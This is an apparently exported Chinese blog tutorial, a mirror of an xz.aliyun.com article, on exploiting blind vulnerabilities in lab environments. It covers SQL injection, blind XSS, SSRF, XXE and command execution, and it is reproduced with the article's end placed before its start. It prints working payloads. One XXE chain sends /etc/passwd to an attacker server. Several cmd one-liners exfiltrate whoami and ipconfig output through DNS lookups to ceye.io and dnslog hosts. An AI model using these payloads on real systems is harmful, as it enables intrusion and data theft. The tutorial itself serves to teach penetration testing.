class=\"line\">//%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class=\"line\">//%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。</span><br><span class=\"line\">//%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。</span><br><span class=\"line\">//%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。</span><br><span class=\"line\">//%PATH%                   系统       指定可执行文件的搜索路径。</span><br><span class=\"line\">//%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。</span><br><span class=\"line\">//%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。</span><br><span class=\"line\">//%PROCESSOR_IDENTFIER%    系统       返回处理器说明。</span><br><span class=\"line\">//%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。</span><br><span class=\"line\">//%PROCESSOR_REVISION%     系统       返回处理器的版本号。</span><br><span class=\"line\">//%PROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。</span><br><span class=\"line\">//%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。</span><br><span class=\"line\">//%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。</span><br><span class=\"line\">//%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。</span><br><span class=\"line\">//%TEMP%和%TMP%            系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。</span><br><span class=\"line\">//%TIME%                   系统       返回当前时间。使用与                                                                                   time       /t                                                                     命令相同的格式。由         Cmd.exe                  生成。有关                       time   命令的详细信息，请参阅 Time。</span><br><span class=\"line\">//%USERDOMAIN%             本地       返回包含用户帐户的域的名称。</span><br><span class=\"line\">//%USERNAME%               本地       返回当前登录的用户的名称。</span><br><span class=\"line\">//%USERPROFILE%            本地       返回当前用户的配置文件的位置。</span><br><span class=\"line\">//%WINDIR%                 系统       返回操作系统目录的位置。</span><br></pre></td></tr></table></figure>\n<h4 id=\"5-2-2-其他命令执行\"><a href=\"#5-2-2-其他命令执行\" class=\"headerlink\" title=\"5.2.2 其他命令执行\"></a>5.2.2 其他命令执行</h4><figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd /c whoami &gt; temp &amp;&amp; certutil -encode -f temp temp&amp;&amp;FOR /F &quot;eol=- delims=&quot; %i IN (temp) DO (set _=%i &amp; cmd /c nslookup %_:~0,-1%.xxxx.ceye.io)&amp;del temp</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd /c ipconfig &gt; temp &amp;&amp; certutil -encode -f temp temp&amp;&amp;FOR /F &quot;eol=- delims=&quot; %i IN (temp) DO (set _=%i &amp; cmd /c nslookup %_:~0,40%.xxxx.ceye.io &amp; cmd /c nslookup %_:~40,-1%.xxxx.ceye.io)&amp;del temp</span><br></pre></td></tr></table></figure>\n\n<p>通过POST传参测试<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505162550-1ce46dae-aed3-4995-9021-f8a247144874.png#align=left&display=inline&height=95&margin=%5Bobject%2Object%5D&originHeight=159&originWidth=414&status=done&style=none&width=248\"><br>传参的内容需要进行url编码<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505162770-391b3b8d-9947-440a-9529-5004a5bbd534.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&originHeight=431&originWidth=1521&status=done&style=none&width=415\"><br>Post传参<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505163079-b19d4b32-222e-4b37-ab74-a88964a3839b.png#align=left&display=inline&height=138&margin=%5Bobject%2Object%5D&originHeight=407&originWidth=1226&status=done&style=none&width=416\"><br>Dnslog获取结果<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505163323-d049cc56-b450-4492-8ee3-434865c75b6c.png#align=left&display=inline&height=170&margin=%5Bobject%2Object%5D&originHeight=465&originWidth=1135&status=done&style=none&width=415\"><br>Base64解码获取内容<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505163685-f6a56798-fc6e-4dd3-8f6b-520b6a7efd23.png#align=left&display=inline&height=229&margin=%5Bobject%2Object%5D&originHeight=382&originWidth=648&status=done&style=none&width=389\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>       在渗透测试过程中，无回显是很常见的，程序不可能将一些操作都回显到页面中，那么这种时候我们就需要外带数据来获取想要的内容。当然最好就是能够反弹shell，通过获取shell来执行命令，这样会舒服很多。<br>       无回显的情况还有很多很多，这里简单介绍了几种，希望读者朋友们能够从中学到对于无回显的情况下如何进行渗透测试，方法很多，不固定，学习思路即可。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<blockquote>\n<p>本文已发布到先知社区：<a href=\"https://xz.aliyun.com/t/9916\">https://xz.aliyun.com/t/9916</a></p>\n<p>作者：ajie</p>\n</blockquote>\n<h1 id=\"0x01前言\"><a href=\"#0x01前言\" class=\"headerlink\" title=\"0x01前言\"></a>0x01前言</h1><p>在渗透测试过程中，开发不可能每一次都将结果输出到页面上，也就是漏洞无回显的情况，那么在这种情况下，我们可以通过dnslog判断漏洞存在，或者通过起一个python的http服务来判断，方法很多，下面主要进行一些情况的分析。</p>\n<h1 id=\"0x02无回显概念\"><a href=\"#0x02无回显概念\" class=\"headerlink\" title=\"0x02无回显概念\"></a>0x02无回显概念</h1><p>无回显，即执行的payload在站点没有输出，无法进行进一步操作。在渗透测试过程中，漏洞点不可能总是能够在返回页面进行输出，那么这时候就需要进行一些无回显利用了。</p>\n<h1 id=\"0x03不同漏洞的无回显\"><a href=\"#0x03不同漏洞的无回显\" class=\"headerlink\" title=\"0x03不同漏洞的无回显\"></a>0x03不同漏洞的无回显</h1><h2 id=\"1、SQL注入无回显\"><a href=\"#1、SQL注入无回显\" class=\"headerlink\" title=\"1、SQL注入无回显\"></a>1、SQL注入无回显</h2><p>SQL注入，作为OWASP常年占据榜首位置的漏洞，在无回显中也是常见的。当然SQL注入在无回显上已经具有了一定的解决措施。<br>无回显我将其定义为页面没有输出我们想要得到的内容，下面以sqli-labs为例进行讲解。</p>\n<h3 id=\"1-1-布尔盲注\"><a href=\"#1-1-布尔盲注\" class=\"headerlink\" title=\"1.1 布尔盲注\"></a>1.1 布尔盲注</h3><p>       布尔盲注，盲注的一种，当网站通过查询语句的布尔值返回真假来输出页面信息的时候，查询语句为真，页面输出内容；查询语句为假，页面不输出内容。那么这里就可以通过构造等号判断，获取相应的字符的ascii码，最后还原出数据。具体测试过程如下：<br>1、id传参1之后，页面返回有数据，这里明显不能进行显错注入了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152244-ad7b9b8a-6ea0-4cdd-a3e0-0a5eb45ed92f.png#align=left&display=inline&height=156&margin=%5Bobject%2Object%5D&originHeight=315&originWidth=837&status=done&style=none&width=415\"><br>2、在传参后面加个单引号，页面返回空，不显示错误信息，不能使用报错注入。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152514-71e97518-c208-4b9d-9a4e-61b1dcf4357f.png#align=left&display=inline&height=165&margin=%5Bobject%2Object%5D&originHeight=319&originWidth=802&status=done&style=none&width=415\"><br>3、通过拼接and 1=1和and 1=2，发现页面对于布尔值的真与假返回的页面结果也不同。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152745-73cf1785-59ee-4551-9d74-7ba98d2cec44.png#align=left&display=inline&height=153&margin=%5Bobject%2Object%5D&originHeight=290&originWidth=790&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152244-ad7b9b8a-6ea0-4cdd-a3e0-0a5eb45ed92f.png#align=left&display=inline&height=156&margin=%5Bobject%2Object%5D&originHeight=315&originWidth=837&status=done&style=none&width=415\"></p>\n<p>4、通过length()函数判断数据库库名的长度大于1。<br>?id=1’ and length(database())&gt;1 %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153079-ba58f545-ae61-431e-8818-bc12922659e2.png#align=left&display=inline&height=145&margin=%5Bobject%2Object%5D&originHeight=299&originWidth=856&status=done&style=none&width=415\"><br>5、在大于8的时候页面返回空，所以数据库库名长度等于8。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153336-eed66eb5-75a1-4e17-b7fe-a758a9223de1.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&originHeight=299&originWidth=847&status=done&style=none&width=415\"><br>6、通过ascii()函数和substr ()截取函数获取数据库库名的第一个字符的ascii码<br>?id=1’ and ascii(substr((select database()),1,1))&gt;97 %23<br>?id=1’ and ascii(substr((select database()),1,1))=101 %23<br>首先用大于号判断出大概所处的值，最后使用等于号验证ascii码的值。此处得出数据库库名的第一个字符的ascii码值为115，对应字符为s。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153599-f01e6d2c-ae3c-4f6f-b9ea-1f7fe4b77bdc.png#align=left&display=inline&height=148&margin=%5Bobject%2Object%5D&originHeight=310&originWidth=871&status=done&style=none&width=415\"><br>7、更改截取的位置，判断后面的字符对应的ascii码值。<br>?id=1’ and ascii(substr((select database()),2,1))=101 %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153874-95d56f80-1ac9-4a44-93a7-b4d8f7c63939.png#align=left&display=inline&height=147&margin=%5Bobject%2Object%5D&originHeight=287&originWidth=810&status=done&style=none&width=416\"></p>\n<h3 id=\"1-2-延时盲注\"><a href=\"#1-2-延时盲注\" class=\"headerlink\" title=\"1.2 延时盲注\"></a>1.2 延时盲注</h3><p>       延时盲注，一种盲注的手法。在渗透测试过程中当我们不能使用显错注入、报错注入以及布尔盲注无论布尔值为真还是为假，页面都返回一样之后，我们可以尝试使用延时盲注，通过加载页面的时间长度来判断数据是否成功。在PHP中有一个if()函数，语法为if(exp1,exp2,exp3)，当exp1返回为真时，执行exp2，返回为假时，执行exp3。配合延时函数sleep()来获取相应数据的ascii码，最后还原成数据。下面我将通过实例来介绍如今进行延时盲注。<br>1、首先获取的页面如下，后面不论接上布尔值为真还是为假的，页面都返回一样，此时将不能使用布尔盲注。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505154171-53cd2d36-c123-4091-ba74-fb80319ba1f9.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&originHeight=277&originWidth=785&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505154477-058cbb12-c306-42db-8afd-7b9c0b26dd87.png#align=left&display=inline&height=154&margin=%5Bobject%2Object%5D&originHeight=295&originWidth=796&status=done&style=none&width=416\"><br>2、通过and拼接延时函数查看页面是否有延时回显。首先记录没有使用延时函数的页面返回时间，为4.*秒；使用sleep(5)延时5秒之后，页面响应时间为9.*秒，说明对于我们输入的sleep()函数进行了延时处理，此处存在延时盲注。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505154774-5573d6ac-4de8-4808-b813-7c983b1e63a3.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&originHeight=418&originWidth=1448&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505155245-cac61cf1-0e9f-41cf-a967-182f57ac1554.png#align=left&display=inline&height=116&margin=%5Bobject%2Object%5D&originHeight=382&originWidth=1371&status=done&style=none&width=415\"><br>3、通过延时注入判断数据库库名的长度。一个个测试发现当长度等于8时页面延时返回了，说明数据库库名长度为8。<br>?id=2’ and if((length(database())=8),sleep(5),1) %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505155513-36485f8a-abee-4402-a197-44636b0a2f86.png#align=left&display=inline&height=167&margin=%5Bobject%2Object%5D&originHeight=434&originWidth=1081&status=done&style=none&width=415\"><br>4、与布尔盲注一样，将子查询的数据截断之后判断ascii码，相等时延时5秒。最后得到第一个字符的ascii码为115。<br>?id=2’ and if((ascii(substr((select database()),1,1))=115),sleep(5),1) %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505155940-da473dc6-2ac2-4ec1-b180-7c6456d0de47.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&originHeight=423&originWidth=1220&status=done&style=none&width=415\"><br>5、后面替换截断的位置，测试后面的字符的ascii码值。最后得到对应的ascii码值为115 101 99 117 114 105 116 121。通过ascii解码工具解得数据库库名为security。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505156315-650ab5b8-b418-4536-bc9e-ba70ca07f13c.png#align=left&display=inline&height=286&margin=%5Bobject%2Object%5D&originHeight=477&originWidth=666&status=done&style=none&width=400\"></p>\n<h3 id=\"巧用dnslog进行SQL注入\"><a href=\"#巧用dnslog进行SQL注入\" class=\"headerlink\" title=\"巧用dnslog进行SQL注入\"></a>巧用dnslog进行SQL注入</h3><p>       前面介绍了SQL注入中的盲注，通过布尔盲注或者延时盲注来获取数据需要的步骤非常繁琐，不仅需要一个一个字符的获取，最后还需要进行ascii解码，这需要花费大量的时间与精力。为了加快渗透进程，以及降低获取数据的难度，这里介绍如何通过dnslog进行SQL注入。</p>\n<h4 id=\"Dnslog\"><a href=\"#Dnslog\" class=\"headerlink\" title=\"Dnslog\"></a>Dnslog</h4><p>       dnslog，即dns日志，会解析访问dns服务的记录并显示出来，常被用来测试漏洞是否存在以及无法获取数据的时候进行外带数据。简单来说，dnslog就是一个服务器，会记录所有访问它的记录，包括访问的域名、访问的IP以及时间。那么我们就可以通过子查询，拼接dnslog的域名，最后通过dns日志得到需要的数据。</p>\n<h4 id=\"Load-file-函数\"><a href=\"#Load-file-函数\" class=\"headerlink\" title=\"Load_file()函数\"></a>Load_file()函数</h4><p>       数据库中的load_file()函数，可以加载服务器中的内容。load_file(‘c:/1.txt’)，读取文件并返回内容为字符串，使用load_file()函数获取数据需要有以下几个条件：<br>       1.文件在服务器上<br>       2.指定完整路径的文件<br>       3.必须有FILE权限</p>\n<h4 id=\"UNC路径\"><a href=\"#UNC路径\" class=\"headerlink\" title=\"UNC路径\"></a>UNC路径</h4><p>       UNC路径就是类似\\softer这样的形式的网络路径。它符合 <strong>\\服务器名\\服务器资源</strong>的格式。在Windows系统中常用于共享文件。如\\192.168.1.1\\共享文件夹名。</p>\n<h4 id=\"Dnslog注入实例演示\"><a href=\"#Dnslog注入实例演示\" class=\"headerlink\" title=\"Dnslog注入实例演示\"></a>Dnslog注入实例演示</h4><p>1、打开实例站点，很明显这里是只能使用盲注的站点。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505156851-edecb966-dc2b-46c0-bbba-280a9a6586f7.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&originHeight=516&originWidth=1046&status=done&style=none&width=415\"><br>2、通过order by判断出字段数为3。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505157359-df1d201d-8e3f-4ae7-abad-93e6f6a15a3a.png#align=left&display=inline&height=238&margin=%5Bobject%2Object%5D&originHeight=451&originWidth=785&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505157735-72a8dfd4-3a1d-4bcb-a55f-ff7862eef954.png#align=left&display=inline&height=228&margin=%5Bobject%2Object%5D&originHeight=448&originWidth=814&status=done&style=none&width=415\"><br>3、在dnslog网站申请一个dnslog域名：pcijrt.dnslog.cn<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505158068-3fd1f43e-d354-4c51-a466-2c88660f7ff9.png#align=left&display=inline&height=166&margin=%5Bobject%2Object%5D&originHeight=413&originWidth=1035&status=done&style=none&width=415\"><br>4、通过load_file函数拼接查询数据库库名的子查询到dnslog的域名上，后面任意接一个不存在的文件夹名。最后将这个查询放到联合查询中，构造的payload如下：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 &#x27; union select 1,2,load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.pcijrt.dnslog.cn</span><br><span class=\"line\">/abc&#x27;)) %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505158457-b4c723f7-cdba-43c0-9fc4-5d284d9f1728.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&originHeight=413&originWidth=1189&status=done&style=none&width=415\"><br>5、执行语句之后在dnslog日志中获取到数据库库名为security。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505158874-723d612b-a6df-4d1d-a38b-98cf9036ddcb.png#align=left&display=inline&height=168&margin=%5Bobject%2Object%5D&originHeight=434&originWidth=1072&status=done&style=none&width=415\"><br>6、修改子查询里的内容，获取其他数据。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505159168-1cca463c-9c90-42db-822d-f944b8727a1f.png#align=left&display=inline&height=185&margin=%5Bobject%2Object%5D&originHeight=537&originWidth=1209&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505159492-cc5dc626-b30c-4763-8fb0-f6285add8085.png#align=left&display=inline&height=166&margin=%5Bobject%2Object%5D&originHeight=490&originWidth=1227&status=done&style=none&width=415\"></p>\n<h2 id=\"2、XSS无回显\"><a href=\"#2、XSS无回显\" class=\"headerlink\" title=\"2、XSS无回显\"></a>2、XSS无回显</h2><p>XSS无回显比较特殊，一般XSS漏洞的判断标准为弹框，但是有这样一种情况，在一个表单提交处，内容提交之后只会在页面显示提交成功与否，不会输出提交的内容，那么我们也就无法通过弹框来判断XSS漏洞存在与否。这时候就需要通过XSS盲打来进行攻击。下面通过Pikachu漏洞练习平台来进行实例讲解：</p>\n<h3 id=\"2-1-XSS盲打\"><a href=\"#2-1-XSS盲打\" class=\"headerlink\" title=\"2.1 XSS盲打\"></a>2.1 XSS盲打</h3><p>1、如图这里是一个提交看法的功能<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505159770-c89b0ec9-0436-4cf8-8f14-803ac998a67e.png#align=left&display=inline&height=171&margin=%5Bobject%2Object%5D&originHeight=500&originWidth=1217&status=done&style=none&width=415\"><br>2、随便输入内容提交，告诉我们提交成功，没有将我输入的内容返回到页面中<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160001-28ff893d-98ad-43cc-b6a4-3c8c2f982dc9.png#align=left&display=inline&height=207&margin=%5Bobject%2Object%5D&originHeight=345&originWidth=569&status=done&style=none&width=341\"><br>3、登录后台可以看到确实有数据回显<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160252-54df82c0-b513-4071-b4fa-8f2716f4514a.png#align=left&display=inline&height=82&margin=%5Bobject%2Object%5D&originHeight=317&originWidth=1617&status=done&style=none&width=416\"><br>4、输入弹框语句会在后台成功执行<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160525-58331697-af8f-4fe1-a420-f170f43cb0d6.png#align=left&display=inline&height=128&margin=%5Bobject%2Object%5D&originHeight=362&originWidth=1175&status=done&style=none&width=415\"><br>5、在渗透测试过程中我们无法登录后台进行查看，那么就需要盲打XSS，输入XSS平台的payload，坐等管理员查看内容后上钩。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160770-d75465c1-9a36-4a5f-bb0f-0256f7108eea.png#align=left&display=inline&height=235&margin=%5Bobject%2Object%5D&originHeight=395&originWidth=699&status=done&style=none&width=415\"></p>\n<h3 id=\"2-2-通过dnslog判断漏洞存在\"><a href=\"#2-2-通过dnslog判断漏洞存在\" class=\"headerlink\" title=\"2.2 通过dnslog判断漏洞存在\"></a>2.2 通过dnslog判断漏洞存在</h3><figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">payload</span>:</span><br><span class=\"line\">&lt;img src=http://xss.t7y3wc.dnslog.cn&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626688564769-dcba54f1-6694-483e-bbb0-2ef4287b50e8.png#align=left&display=inline&height=294&margin=%5Bobject%2Object%5D&name=image.png&originHeight=588&originWidth=742&size=40726&status=done&style=none&width=371\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626688575999-b7c4d322-0f4c-49a4-9da1-496c6dbc6b13.png#align=left&display=inline&height=223&margin=%5Bobject%2Object%5D&name=image.png&originHeight=446&originWidth=1636&size=54194&status=done&style=none&width=818\" alt=\"image.png\"></p>\n<h2 id=\"3、SSRF无回显\"><a href=\"#3、SSRF无回显\" class=\"headerlink\" title=\"3、SSRF无回显\"></a>3、SSRF无回显</h2><p>SSRF即服务端请求伪造，一种由攻击者构造的通过服务器发起请求的攻击。<br>测试代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> file_get_contents(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;url&#x27;</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>首先通过访问百度可以验证漏洞存在<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011741087-fbffd788-bf83-4b17-90e6-c147539273c9.png#align=left&display=inline&height=343&margin=%5Bobject%2Object%5D&name=image.png&originHeight=686&originWidth=1722&size=49389&status=done&style=none&width=861\" alt=\"image.png\"><br>无回显情况即不进行输出，页面返回空<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011767609-826cc500-1e74-42fc-bb0a-e205fd70abb9.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=812&size=9552&status=done&style=none&width=406\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011778291-6d43af3c-3612-4913-a7a4-98d96252c5ee.png#align=left&display=inline&height=129&margin=%5Bobject%2Object%5D&name=image.png&originHeight=258&originWidth=1002&size=18063&status=done&style=none&width=501\" alt=\"image.png\"><br>这种情况可以通过dnslog或者python搭建http服务验证<br>1、DNSLOG<br><a href=\"http://172.16.29.2/ssrf_test.php?url=http://ssrf.02c6ot.dnslog.cn\">http://172.16.29.2/ssrf_test.php?url=http://ssrf.02c6ot.dnslog.cn</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011861845-ebd9644c-a3d9-4fbd-8777-4c96a1ce90f7.png#align=left&display=inline&height=179&margin=%5Bobject%2Object%5D&name=image.png&originHeight=358&originWidth=1518&size=40848&status=done&style=none&width=759\" alt=\"image.png\"><br>2、python起的http服务</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -m http.server <span class=\"number\">4545</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"http://172.16.29.2/ssrf_test.php?url=http://172.16.29.1:4545\">http://172.16.29.2/ssrf_test.php?url=http://172.16.29.1:4545</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011927228-dc71a133-b743-44db-83a8-7847879faffa.png#align=left&display=inline&height=136&margin=%5Bobject%2Object%5D&name=image.png&originHeight=272&originWidth=1076&size=19631&status=done&style=none&width=538\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011943684-3ba6d898-3620-4c3f-ade8-803b021288c7.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=196&originWidth=1276&size=53498&status=done&style=none&width=638\" alt=\"image.png\"></p>\n<h2 id=\"4、XXE无回显\"><a href=\"#4、XXE无回显\" class=\"headerlink\" title=\"4、XXE无回显\"></a>4、XXE无回显</h2><p>因为XML是用来存储传输数据的，除了确实是业务需要，否则开发不可能会输出内容，也就是说你确实读取到了文件内容，但是没办法看到。XXE无回显问题当然也是可以通过在域名前面放入查询出的内容，将数据通过dns日志记录下来。<br>XXE虽然不是通过DNSlog，但是也同样是外带数据。<br>流程如下：<br>在受害者网站中，我们通过请求攻击者VPS上的1.xml文件，文件内容为将某数据放在GET传参中去访问2.php。然后2.php中的内容为保存GET传参的数据，将数据放入到3.txt中。<br>具体文件内容放在下面，里面的IP地址应该为攻击者的IP地址，这3个文件也是放在攻击者VPS上。<br>1.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!ENTITY% <span class=\"meta-keyword\">all</span> <span class=\"meta-string\">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://攻击者的IP地址/2.php?id=%file;&#x27;&gt;&quot;</span>&gt;</span>%all;</span><br></pre></td></tr></table></figure>\n<p>2.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> file_put_contents(<span class=\"string\">&quot;3.txt&quot;</span>,<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;id&quot;</span>],FILE_APPEND);<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>3.txt</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内容空</span><br></pre></td></tr></table></figure>\n\n\n<p>payload：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">ANY</span>[</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">file</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">remote</span> <span class=\"meta-keyword\">SYSTEM</span><span class=\"meta-string\">&quot;http://服务器IP地址/xxe/1.xml&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">%remote;</span></span><br><span class=\"line\"><span class=\"meta\">%send;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"5、命令执行无回显\"><a href=\"#5、命令执行无回显\" class=\"headerlink\" title=\"5、命令执行无回显\"></a>5、命令执行无回显</h2><p>简单的命令执行站点<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161034-780f4d5e-9f34-4707-a863-eafbd9d39650.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&originHeight=162&originWidth=520&status=done&style=none&width=312\"><br>输入任何命令都无回显<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161304-f8990d48-cbc4-4e55-8e44-d70081631de0.png#align=left&display=inline&height=102&margin=%5Bobject%2Object%5D&originHeight=216&originWidth=876&status=done&style=none&width=415\"></p>\n<h3 id=\"5-1-Dnslog判断漏洞存在\"><a href=\"#5-1-Dnslog判断漏洞存在\" class=\"headerlink\" title=\"5.1 Dnslog判断漏洞存在\"></a>5.1 Dnslog判断漏洞存在</h3><p><a href=\"http://127.0.0.1/test_blind/exec.php?cmd=ping+lhg3du.dnslog.cn\">http://127.0.0.1/test_blind/exec.php?cmd=ping+lhg3du.dnslog.cn</a><br><img 